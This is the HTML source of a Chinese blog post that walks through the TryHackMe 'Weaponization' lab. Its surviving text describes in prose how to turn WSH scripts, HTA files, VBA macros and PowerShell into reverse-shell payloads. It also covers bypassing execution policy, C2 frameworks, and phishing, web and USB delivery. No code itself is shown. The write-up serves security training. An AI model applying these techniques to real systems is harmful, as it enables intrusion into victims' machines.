<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-Weaponization | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-Weaponization"><meta name="application-name" content="THM-Weaponization"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-Weaponization"><meta property="og:url" content="http://hybcx.xyz/2024/07/12/thm-weaponization/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 介绍 在这个房间里，我们将讨论用于武器化的不同技术。  什么是Weaponization 武器化是网络杀伤链模型的第二阶段。在此阶段，攻击者使用可交付的有效负载（例如 Word 文档、PDF 等）生成并开发自己的恶意代码[1]。武器化阶段旨在使用恶意武器来利用目标机器并获得初始访问权限。"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 介绍 在这个房间里，我们将讨论用于武器化的不同技术。  什么是Weaponization 武器化是网络杀伤链模型的第二阶段。在此阶段，攻击者使用可交付的有效负载（例如 Word 文档、PDF 等）生成并开发自己的恶意代码[1]。武器化阶段旨在使用恶意武器来利用目标机器并获得初始访问权限。"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/07/12/thm-weaponization/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-Weaponization',
  postAI: '',
  pageFillDescription: '0x01 介绍, 什么是Weaponization, 0x02 部署Windows机器, 0x03 Windows Scripting Host (WSH), WSH, 0x04 An HTML Application (HTA), HTML 应用程序, HTA反向连接, 通过 Metasploit 的恶意 HTA, 0x05 Visual Basic for Application (VBA), Visual Basic 应用程序 (VBA), 0x06 PowerShell (PSH), PowerShell (PSH), Execution Policy, Bypass Execution Policy, 0x07 C2, 什么是C2？, Cobalt Strike, PowerShell Empire, Metasploit 元分析软件, 0x08 Delivery Techniques, Email Delivery, Web Delivery, USB Delivery, 0x09 练习介绍在这个房间里我们将讨论用于武器化的不同技术什么是武器化是网络杀伤链模型的第二阶段在此阶段攻击者使用可交付的有效负载例如文档等生成并开发自己的恶意代码武器化阶段旨在使用恶意武器来利用目标机器并获得初始访问权限大多数组织都运行操作系统这将成为可能的目标组织的环境策略通常会阻止下载和执行文件以避免安全违规因此红队成员依赖于构建通过各种渠道发送的自定义有效负载例如网络钓鱼活动社会工程浏览器或软件开发或方法下图是武器化的示例其中使用精心制作的自定义或文档来传递恶意负载自定义有效负载配置为连接回红队基础设施的环境有关红队工具包的更多信息请访问以下内容包含所有内容的存储库包括初始访问有效负载开发交付方法等大多数组织都会阻止或监视其受控环境中文件的执行因此红队成员依赖于使用其他技术执行有效负载例如内置脚本技术因此本任务重点关注各种流行且有效的脚本编写技术包括让我们在下一个任务中部署目标机器并在后续任务中开始使用技术部署机器如果您更喜欢通过远程桌面协议连接请首先确保您已连接到然后需要客户端连接到连接的计算机您可以使用工具进行连接该工具可在上找到要通过连接请使用以下命令用户名密码这里我是用的连接脚本主机是一个内置的管理工具它运行批处理文件以自动执行和管理操作系统内的任务它是一个本机引擎用于命令行脚本和用于脚本负责执行各种脚本包括和有关的更多信息请访问此处需要注意的是操作系统上的引擎以与普通用户相同级别的访问和权限来运行和执行应用程序因此它对红队队员很有用现在让我们编写一个简单的代码来创建一个消息框显示欢迎使用消息确保将以下代码保存到文件中例如在第一行中我们使用声明了消息变量然后我们在消息变量中存储一个字符串值在下一行中我们使用函数来显示变量的内容有关函数的更多信息请访问此处然后我们使用来运行并执行的内容结果将弹出一条消息其中包含消息现在让我们使用来运行可执行文件下面的代码是调用计算器证明我们可以使用本机引擎执行文件我们使用创建库的对象来调用执行负载然后我们利用方法来执行有效负载对于此任务我们将运行计算器要执行文件我们可以使用运行它如下所示我们还可以通过运行它如下所示结果计算器将出现在桌面上另一个技巧如果文件被列入黑名单那么我们可以将文件重命名为文件并使用运行它如下所示结果将与执行运行二进制文件的文件一样精确应用程序代表应用程序它允许您创建一个可下载文件其中包含有关如何显示和渲染的所有信息应用程序也称为是包含和的动态页面工具用于执行文件它可以自行执行或从自动执行在下面的示例中我们将在有效负载中使用作为执行的概念证明考虑以下代码然后从服务器提供这可以从攻击机器完成如下所示在受害计算机上使用访问恶意链接请注意是的地址一旦我们按下运行就会被执行然后它将调用下图说明我们已经成功执行了反向连接我们可以创建一个反向有效负载如下所示我们使用框架中的生成恶意负载以连接回攻击机器我们使用以下有效负载将连接到我们的和侦听端口在攻击机上我们需要使用监听端口请注意此端口需要权限才能打开或者您可以使用不同的权限一旦受害者访问恶意并点击运行我们就会恢复连接通过的恶意还有另一种方法可以使用框架生成和提供恶意文件首先使用命令运行框架在部分下有需要选择并设置等信息最后执行来运行该模块在受害计算机上一旦我们访问作为提供的恶意文件我们应该会收到反向连接应用程序代表是为等应用程序实现的一种编程语言编程允许自动执行用户与应用程序之间几乎所有键盘和鼠标交互的任务宏是应用程序其中包含以编程语言编写的嵌入式代码它用于创建自定义函数通过创建自动化流程来加速手动任务的功能之一是访问应用程序编程接口和其他低级功能有关的更多信息请访问此处在此任务中我们将讨论的基础知识以及攻击者使用宏创建恶意文档的方式要跟进此任务的内容请确保在任务中部署连接的计算机准备就绪后即可通过浏览器内访问使用它现在从开始菜单打开打开后我们将关闭产品密钥窗口因为我们将在天的试用期内使用它接下来请确保接受关闭产品密钥窗口后显示的许可协议现在创建一个新的空白文档来创建我们的第一个宏目标是讨论该语言的基础知识并展示如何在打开文档时运行它首先我们需要通过选择视图宏来打开编辑器宏窗口显示在文档中创建我们自己的宏在宏名称部分我们选择将宏命名为请注意我们需要从列表中的宏中进行选择最后选择创建接下来编辑器显示了我们可以在哪里编写代码让我们尝试显示一个消息框其中包含以下消息欢迎来到武器化室我们可以使用函数来做到这一点如下所示最后按或运行宏现在为了在文档打开后自动执行代码我们可以使用和等内置函数请注意我们需要指定文档打开后需要运行的函数名称在我们的例子中是函数需要注意的是为了使宏起作用我们需要将其保存为启用宏的格式例如和现在让我们将文件另存为模板其中通过转到文件保存并保存为类型文档启用宏最后保存让我们关闭保存的文档如果我们重新打开文档文件将显示一条安全消息指示宏已被禁用并为我们提供启用它的选项让我们启用它并继续检查结果一旦我们允许启用内容我们的宏就会执行如图所示现在编辑文档并创建一个执行或任何可执行文件的宏函数作为概念证明如下所示为了详细解释代码我们使用关键字将有效负载变量声明为字符串使用我们指定有效负载名称最后使用有效负载我们创建一个脚本主机对象并运行有效负载请注意如果要重命名函数名称则必须在和函数中也包含该函数名称确保在使用编辑器中的运行功能保存文档之前测试您的代码确保在保存文档之前创建和函数代码运行后现在保存文件并尝试再次打开它值得一提的是我们可以将与之前介绍的方法例如和结合起来宏本身不会绕过任何检测现在让我们使用框架创建一个内存中的有效负载来接收反向首先从中我们使用创建有效负载我们需要指定和它们与框架中的内容相匹配请注意我们将有效负载指定为以将其用作宏输出如下上述终端中的值是我们使用的地址的示例对于您的情况您需要指定的地址导入时请注意需要进行一项修改才能使其工作输出将在工作表上运行因此将更改为以使其适合文档现在复制输出并将其保存到文档的宏编辑器中如我们之前所示在攻击机器上运行框架并设置监听器如下所示记得攻击机上开启的监听模块是一种面向对象的编程语言从中的动态语言运行时执行但遗留用途有一些例外查看房间使用进行黑客攻击了解有关的更多信息红队人员依靠执行各种活动包括初始访问系统枚举等首先我们创建一个简单的脚本用于打印欢迎来到武器化室如下将文件另存为通过写入输出我们打印消息欢迎来到武器化室到命令提示符现在让我们运行它并查看结果的执行策略是一个安全选项用于保护系统免遭恶意脚本的运行默认情况下出于安全目的禁用执行脚本执行策略设置为受限这意味着它允许单个命令但不允许运行任何脚本您可以按如下方式确定当前的设置我们还可以通过运行以下命令轻松更改执行策略之后选即可提供了禁用此限制的方法其中一种方法是为命令提供参数选项将其更改为您所需的设置例如我们可以将其更改为绕过策略这意味着没有任何内容被阻止或限制这很有用因为它可以让我们运行自己的脚本为了确保我们的文件得到执行我们需要在参数中提供绕过选项如下所示现在让我们尝试使用编写的工具之一来获取反向在您的上从下载它并运行网络服务器来传递有效负载攻击机开启监听此任务介绍红队行动中使用的命令和控制框架的基本概念什么是框架是后利用框架允许红队成员协作并控制受感染的机器被认为是红队人员在进攻性网络行动中最重要的工具之一框架提供快速直接的方法来生成各种恶意负载枚举受感染的机器网络执行权限升级和旋转我们将简要介绍的一些流行的框架包括这些框架中的大多数旨在支持一个方便的环境以便在获得系统的初始访问权限后红队操作之间可以进行共享和通信是一个专注于对手模拟和红队行动的商业框架它是远程访问工具后利用功能和独特的报告系统的组合它为代理提供了先进的技术来建立秘密通信并执行各种操作包括键盘记录文件上传和下载部署权限升级技术端口扫描和最先进的横向移动是一个开源框架可帮助红队操作员和渗透测试人员使用密钥和共享密码跨多个服务器进行协作它是一个基于和代理的开发框架专注于和环境的客户端和后期开发如果您想了解有关的更多信息我们建议您尝试一下这个房间元分析软件是一种广泛使用的漏洞利用框架它提供了各种技术和工具来轻松执行黑客攻击它是一个开源框架被认为是渗透测试和红队运营的主要工具之一是我们在这个房间中使用的工具之一用于为我们的武器化阶段生成有效负载如果您想了解有关框架的更多信息我们建议您查看模块大多数框架都使用本房间提到的技术作为初始访问阶段的准备有关框架的更多详细信息我们邀请您查看简介室交付技术是获得初始访问的重要因素之一他们必须让受害者看起来专业合法且令人信服才能贯彻执行内容这是通过发送带有链接或附件的网络钓鱼电子邮件来发送有效负载的常用方法欲了解更多信息请访问此处此方法会附加一个恶意文件该文件可能是我们之前提到的类型目标是说服受害者访问恶意网站或下载并运行恶意文件以获得对受害者网络或主机的初始访问权限红队成员应该拥有自己的用于网络钓鱼目的的基础设施根据红队参与要求需要在电子邮件服务器内设置各种选项包括域名密钥识别邮件发件人策略框架和指针记录红队成员还可以使用第三方电子邮件服务例如以及其他声誉良好的服务另一种有趣的方法是使用公司内受损的电子邮件帐户向公司内部或其他人发送网络钓鱼电子邮件受损的电子邮件可能会通过网络钓鱼或其他技术例如密码喷射攻击遭到黑客攻击另一种方法是在红队成员控制的网络服务器上托管恶意负载服务器必须遵循安全准则例如其域名和传输层安全证书的干净记录和声誉欲了解更多信息请访问此处此方法包括其他技术例如通过社会工程让受害者访问或下载恶意文件使用此方法时缩短器可能会有所帮助在该方法中可以组合和使用其他技术攻击者可以利用漏洞例如利用或浏览器等易受攻击的软件将其用于网络钓鱼电子邮件或交付技术从而获得对受害计算机的访问权限这种方法需要受害者物理插入恶意在对手可以分发的会议或活动中此方法可能有效且有用有关传输的更多信息请访问此处通常组织会制定强有力的策略例如出于安全目的在其组织环境中禁用使用而其他组织允许在目标环境中使用它用于武器化设备的常见攻击包括和充电电缆例如练习我们准备了一台计算机该计算机运行用户模拟应用程序来执行您的有效负载或自动访问恶意链接部署连接的计算机并等待几分钟直到其启动并运行然后访问用户模拟器应用程序确保从访问用户模拟器应用程序或者您可以通过连接到来访问它应用程序允许将有效负载上传为文件此外如果您提供恶意链接应用程序将访问您的链接文件注意在提供的机器中使用的模拟将打开恶意文档并在秒内关闭为了获得更长时间的预知您需要在收到返回连接后立即迁移在框架中我们可以使用将当前进程注入到受害机器上的另一个进程中在我们的例子中我们需要将当前进程即文档迁移到另一个进程以使连接稳定即使文档关闭也是如此最简单的方法是使用迁移后模块如下所示在此任务中目标是生成您选择的反向负载并通过应用程序发送它一旦应用程序运行您的有效负载您应该会收到返回的连接回答下面的问题并在收到反向后找到该标志来证明您的访问权限作为参考您可以使用本网站上的备忘单这里使用的的',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-08-01 16:12:34',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 